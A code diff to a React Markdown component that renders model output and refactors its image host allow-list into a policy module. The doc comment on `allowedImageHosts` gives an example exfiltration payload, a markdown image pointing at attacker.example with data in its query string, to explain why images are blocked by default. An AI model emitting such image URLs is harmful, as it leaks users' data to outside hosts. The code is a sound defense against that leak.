@@ -5,6 +5,7 @@ import ReactMarkdown, { type Components } from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import remend from 'remend';
 import { ImageIcon } from './lib/icons';
+import { getImagePolicy, isAllowedImage } from './lib/images';
 import { CodeLines, CopyButton } from './lib/primitives';
 import { cn } from './lib/utils';
 
@@ -148,23 +149,8 @@ function CodeBlock({ children }: { children?: ReactNode }) {
   );
 }
 
-const NO_HOSTS: readonly string[] = [];
-/** Hosts images may load from (see `MarkdownProps.allowedImageHosts`). */
-const ImageHostsContext = createContext(NO_HOSTS);
-
-function isAllowedImage(src: string, hosts: readonly string[]): boolean {
-  if (hosts.includes('*')) return true;
-  try {
-    // Relative and protocol-relative URLs have no base here, so they throw and are blocked.
-    const url = new URL(src);
-    return (
-      (url.protocol === 'https:' || url.protocol === 'http:') &&
-      hosts.some((host) => [url.hostname, url.host].includes(host.toLowerCase()))
-    );
-  } catch {
-    return false;
-  }
-}
+/** Where images may load from (see `MarkdownProps.allowedImageHosts`). */
+const ImagePolicyContext = createContext(getImagePolicy(undefined));
 
 const linkClass =
   'text-aui-accent-fg decoration-aui-accent/40 hover:decoration-aui-accent focus-visible:outline-aui-ring font-medium underline underline-offset-2 transition-colors focus-visible:outline-2 focus-visible:outline-offset-1';
@@ -186,10 +172,10 @@ function MarkdownImage({
   /** The image is the content of a link, so its fallback must not be a link too. */
   inLink: boolean;
 }) {
-  const hosts = useContext(ImageHostsContext);
+  const policy = useContext(ImagePolicyContext);
   // Unsafe protocols, and images that are still streaming, arrive with an empty URL.
   if (!src) return alt ? <>{alt}</> : null;
-  if (isAllowedImage(src, hosts)) {
+  if (isAllowedImage(src, policy)) {
     return <img src={src} alt={alt ?? ''} title={title} className="my-2 inline-block max-w-full rounded-lg" />;
   }
   const label = (
@@ -350,9 +336,15 @@ export interface MarkdownProps {
   /** Must match the `idPrefix` of the `Sources` the citations point to. Default "source". */
   citationPrefix?: string;
   /**
-   * Hosts that images may load from, e.g. `['images.example.com', 'localhost:3000']` (exact
-   * host names of http(s) URLs); `'*'` allows every image. Default: none. A URL in model output can leak data when the
-   * browser fetches it, so other images render as links and nothing is requested.
+   * Where images may load from. Default: nowhere. The browser fetches an image as soon as it
+   * renders, so a URL in model output can leak data (`![](https://attacker.example/p.png?d=…)`);
+   * a blocked image renders as a link with its alt text, and nothing is requested.
+   *
+   * - A host name of http(s) URLs, matched exactly: `'images.example.com'` (any port), or
+   *   `'localhost:3000'` (that port only).
+   * - `'self'`: relative URLs (`/logo.png`, `./chart.png`), which load from your own origin.
+   *   `//host/x` is not relative. An absolute URL to your own site needs its host listed.
+   * - `'*'`: every image.
    */
   allowedImageHosts?: readonly string[] | undefined;
   components?: Components;
@@ -386,13 +378,14 @@ export const Markdown = memo(function Markdown({
     [citations, citationPrefix],
   );
   const merged = useMemo(() => (overrides ? { ...components, ...overrides } : components), [overrides]);
+  const imagePolicy = useMemo(() => getImagePolicy(allowedImageHosts), [allowedImageHosts]);
   return (
     <div
       data-aui
       data-slot="markdown"
       className={cn('font-aui-sans text-aui-fg text-[14.5px] leading-[1.7] [overflow-wrap:anywhere]', className)}
     >
-      <ImageHostsContext value={allowedImageHosts ?? NO_HOSTS}>
+      <ImagePolicyContext value={imagePolicy}>
         <ReactMarkdown
           // Plugin tuples are typed loosely by unified; the shapes above are correct.
           remarkPlugins={remarkPlugins as never}
@@ -401,7 +394,7 @@ export const Markdown = memo(function Markdown({
         >
           {text}
         </ReactMarkdown>
-      </ImageHostsContext>
+      </ImagePolicyContext>
     </div>
   );
 });
